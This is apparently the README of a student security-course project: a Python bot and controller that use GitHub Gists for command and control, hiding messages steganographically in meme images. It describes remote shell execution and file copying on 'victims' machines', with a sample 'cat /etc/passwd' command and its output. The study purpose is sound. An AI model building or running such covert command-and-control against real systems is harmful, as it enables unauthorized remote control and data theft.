# bot

A simple Python bot and a controller that uses [gist.github.com] for communication.

❗️ **Note:** This very simple bot was created purely for learning purposes as a solution of the "Black Gate" task from
the final Stage 5 of the Bonus Assignment from the [CTU FEE][ctu-fee] ([ČVUT FEL][cvut-fel])
[BSY course][ctu-fee-bsy] (Winter 2022/2023 term).


## Content

<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->

- [Background](#background)
- [Features](#features)
- [Implementation](#implementation)
	- [Communication protocol](#communication-protocol)
	- [Controlling the controller](#controlling-the-controller)
	- [Controlling the bot](#controlling-the-bot)
- [Usage](#usage)
	- [Controller](#controller)
	- [Bot](#bot)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->


## Background

The task's description from the CTFd:
> The final Stage 5 consists of only one task. You have to code a Python bot and a controller that
> uses [gist.github.com] for communication. See the attached [instructions.txt](./instructions.txt)
> file for the details.

See the [instructions.txt](./instructions.txt) for the details.


## Features

* [gist.github.com] is used for communication
* all messages between the controller and the bots are passed hidden in [the tech meme images][images-lib-gist] 🖼️
  so that communication is not (so) suspicious 🤪
* virtually unlimited number of bots 🤖
* the controller checks if the bots are alive ❤️ and maintains an up-to-date list of currently available bots
* the controller does not have to be running all the time in order for the bots to be working
* the controller allows to send commands to a selected (currently available) bot
	* `terminate` – terminate the bot
	* `shell`, `run` – an arbitrary command with arbitrary arguments can be executed on the bot (either in shell or
	  without shell), any spaces within arguments and even the command name are correctly handled and supported as well
	* `copyFrom` – copy an arbitrary file from the bot to the controller, the file name can contain spaces (it is
	  correctly handled)
* another commands to other bots can be sent while waiting on a reply for a bot
	* once the controller receives a reply to a pending command, it informs the user

<p align="center">
<img alt="Available command in the controller" title="Available command in the controller" src="./docs/controller-commands.png" width="640" />
</p>


## Implementation

_Note: The implementation is more of a proof of a concept or demo. There are a lot of possible edge cases that we would
like to handle in the real production-ready implementation._


### Communication protocol

The communication mechanism supports multiple bots (running on victims' machines) and one controller that is running on
the attacker's machine. Note that the controller does not have to be running all the time in order for the bots to be
working.

All messages between the controller and the bots are hidden in the images so that communication is not so suspicious.
We are using the same steganography technique that was used in Stage 3 (appending the zip-compressed data to the normal
image file).

Upon their startup, the controller and the bots download the memes library from
[this Gist][images-lib-gist]. Note that this Gist is read-only
(neither the controller nor the bots have write access).

For the actual communication, another Gist is used. ID of that Gist together with the owner's GitHub
Personal access token (classic) with (at least) `gist` scope must be provided both
to the controller and to any bot via arguments (see [Usage](#usage) section).

Both the controller and the bots periodically (currently the period is set to 30 seconds) pull the latest changes from
the communication's Gist using `git`.

Each bot upon its startup generates a random name that consists of two parts:
1. a random prefix (0-9999)
2. the name of a random image (except the control image security.jpg) from [the memes library][images-lib-gist]

The bot then _registers_ itself by creating a new image with its name (for example `7273-netcat.jpg`) as a copy of the
chosen
image (`netcat.jpg`) but with an added hidden `state.json` file:
```json
{
	"last_update": 1673429102058,
	"result": null
}
```

While the bot is running, it periodically updates the `last_update` to the current date.
Using the `last_update`, the controller can then detect which bots are alive. When the difference between the
controller's current date and a bot's `last_update` exceeds the `KEEP_ALIVE_TIMEOUT` (currently set to 90 seconds),
the controller assumes that bot is no longer running (it has been ungracefully stopped, it crashed, etc.) and it deletes
the corresponding image from the communication gist. In case that the bot in fact comes back online, it will detect that
is registration was deleted (its was deleted image) and re-register itself by creating a new random name (and pushing
the new image).

If the bot is terminated gracefully (either via the `terminate` command or manually by pressing `Ctr-C`), it deletes
its own image (and pushes that change to the gist).

The controller sends commands to bots via a copy of the control image [security.jpg](./template/security.jpg)
which contains a hidden `state.json` file. The `state.json` file contains a map (dictionary) that specifies a command
for each bot. For example:
```json
{
	"7273-netcat.jpg": null,
	"8142-joy.png": {
		"id": "dceaedc887cad72afda01a10dfc266f3",
		"timestamp": 1673429151267,
		"name": "run",
		"shell": false,
		"cmd": "cat /etc/passwd"
	}
}
```

Every bot checks periodically **the control image** to see if there is a new command (every command has a unique
16-bytes `id`). If it detects a new command, it executes it, and then sends the result back to the controller using its
own status image (e.g., `8142-joy.png`) with a hidden a `state.json` file:
```json
{
	"last_update": 1673429162944,
	"result": {
		"id": "dceaedc887cad72afda01a10dfc266f3",
		"timestamp": 1673429162944,
		"exit_code": 0,
		"stdout": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nredis:x:101:101::/var/lib/redis:/usr/sbin/nologin\nsystemd-timesync:x:102:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:103:104:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:104:105:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:105:106::/nonexistent:/usr/sbin/nologin\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\ntcpdump:x:107:108::/nonexistent:/usr/sbin/nologin\nsyslog:x:108:109::/home/syslog:/usr/sbin/nologin\npostfix:x:109:112::/var/spool/postfix:/usr/sbin/nologin\nlogcheck:x:110:114:logcheck system account,,,:/var/lib/logcheck:/usr/sbin/nologin\nDebian-exim:x:111:115::/var/spool/exim4:/usr/sbin/nologin\ncowrie:x:1000:1000:,,,:/home/cowrie:/bin/bash\n",
		"stderr": ""
	}
}
```

Every time the controller pulls the latest changes, it inspects each image (except the control image) and extracts the
corresponding bot's data. If `result.id` equals to the pending command id for that bot, it prints the result and clears
the pending command:
```json
{
	"7273-netcat.jpg": null,
	"8142-joy.png": null
}
```

Next time, the **8142-joy.png** bot pull the latest changes, it sees that there is no command for it and in turn it
updates its state to:
```json
{
	"last_update": 1673429385919,
	"result": null
}
```

Result of the `copy_from` command contains an extra `files` field which contains the name(s) of the copied file(s).
Currently, there is always only one file in the `files` array/list in the `copy_from` command result.
The copied file is transferred hidden in the bot's image file along with the usual `state.json` file (every image
contains a hidden zip archive that can contain multiple files, normally there is only `state.json` file inside).


### Controlling the controller

The controller has a built-in REPL (Read–Eval–Print Loop) that allows the user to enter one of the supported commands.
Currently, it does not support history and arrow navigation.
Note that the REPL does not block the periodical updates.

In oder to see all the available commands together with their short description, the user can use `help` or `?`
commands.
Below you can see the output of the `help` command. Refer to the [Features](#features) section to see it with colors.
```text
Auto update in 30 seconds. Press enter to force update.
Press Ctrl-C to stop.
Enter a command. Use ? or help to show help.
> help

AVAILABLE COMMANDS:

? or help
  Prints this help.
bots
  Lists all bots and their status.
terminate <bot>
  Terminates the bot.
shell <bot> <command>
  Runs the given command on the bot using the following Python code.
    subprocess.run(args=<command>, shell=True)
  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.
  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.
run <bot> <command>
  Runs the given command on the bot using the following Python code.
    subprocess.run(args=shlex.split(<command>), shell=False)
  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.
  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.
copyFrom <bot> <file name>
  Copies the file from the bot to the controller's workdir.
do <bot> id
  Alias for shell <bot> id
do <bot> who
  Alias for shell <bot> who
do <bot> ls <path>
  Alias for shell <bot> ls -lha <path>
```


### Controlling the bot

The bot can be controlled remotely from the controller. Locally (useful especially during the development), it supports
the following interaction:
```text
Auto update in 30 seconds. Press enter to force update.
Press Ctrl-C to unregister and terminate.
```

## Usage

**Requirements:** (same both for the controller's machine and any bot's machine)
* Python 3.8+
* POSIX compliant system
* `zip`, `unzip`, `git`, `touch`
* network access to [gist.github.com]
* a writable working directory

**Note:** The startup order does not matter. The controller does not have to be running
in order for the bots to be working.


### Controller

The controller consists of 2 source files ([common.py](./src/common.py) and [controller.py](./src/controller.py)).
Place them in one (the same) directory.

Start the controller by running and providing at least `workdir`, `gist` and `token` positional arguments:
```bash
python3 controller.py workdir gist token
```

For demo values of `gist` and `token` arguments, refer to the Stage 5 description
in [Martin Endler BSY 2022/2023 Bonus Assignment report][report] (note: the report is shared only with the BSY course's
teachers).

You can use pass the `--help` argument to see the usage:
```text
usage: controller.py [-h] [--author AUTHOR] [--recreate] [--skip-init-reset] [--skip-init-pull] [--fast-init] workdir gist token

positional arguments:
  workdir            work directory where the files and directories created by the controller will be put
  gist               ID of the GitHub Gist for communication with bots
  token              GitHub Personal access token (classic) with (at least) gist scope

optional arguments:
  -h, --help         show this help message and exit
  --author AUTHOR    override the default git commit author (useful when you don't want to leak your global git config author value)
  --recreate         remove and recreate the workdir even if it already exists
  --skip-init-reset  skip resetting the git repos if they already exist
  --skip-init-pull   skip updating the git repos if they already exist
  --fast-init        shortcut for combination of of --skip-init-reset and --skip-init-pull
```

If you want, you can directly clone this repository and use the following command, where you have to provide only
the `gist` and `token` arguments:
```bash
python3 src/controller.py data/controller gist token
```

For demo values of `gist` and `token` arguments, refer to Stage 5 description
in [Martin Endler BSY 2022/2023 Bonus Assignment report][report] (note: the report is shared only with the BSY course's
teachers).


### Bot

The bot consists of 2 source files ([common.py](./src/common.py) and [bot.py](./src/bot.py)).
Place them in one (the same) directory.

Start the bot by running and providing at least `workdir`, `gist` and `token` positional arguments:
```bash
python3 bot.py workdir gist token
```

For demo values of `gist` and `token` arguments, refer to Stage 5 description
in [Martin Endler BSY 2022/2023 Bonus Assignment report][report] (note: the report is shared only with the BSY course's
teachers).

You can use pass the `--help` argument to see the usage:
```text
usage: bot.py [-h] [--author AUTHOR] [--recreate] [--skip-init-reset] [--skip-init-pull] [--fast-init] workdir gist token

positional arguments:
  workdir            work directory where the files and directories created by the bot will be put
  gist               ID of the GitHub Gist for communication with bots
  token              GitHub Personal access token (classic) with (at least) gist scope

optional arguments:
  -h, --help         show this help message and exit
  --author AUTHOR    override the default git commit author (useful when you don't want to leak your global git config author value)
  --recreate         remove and recreate the workdir even if it already exists
  --skip-init-reset  skip resetting the git repos if they already exist
  --skip-init-pull   skip updating the git repos if they already exist
  --fast-init        shortcut for combination of of --skip-init-reset and --skip-init-pull
```

If you want, you can directly clone this repository and use the following command, where you have to provide only
the `gist` and `token` arguments:
```bash
python3 src/bot.py data/bot1 gist token
```

For a demo values of `gist` and `token` arguments, refer to Stage 5 description
in [Martin Endler BSY 2022/2023 Bonus Assignment report][report] (note: the report is shared only with the BSY course's
teachers).



<!-- links references -->

[ctu-fee]: https://fel.cvut.cz/en

[cvut-fel]: https://fel.cvut.cz/cs

[ctu-fee-bsy]: https://cw.fel.cvut.cz/b221/courses/bsy/start

[gist.github.com]: https://gist.github.com/

[report]: https://docs.google.com/document/d/11WQoUg7aVeZ0qubD14JCPRX5W1x1y-dsNeIVRHi2daA/edit?usp=sharing

[images-lib-gist]: https://gist.github.com/pokusew/4c7fe7e6d06b0b90ab4848b234209e95
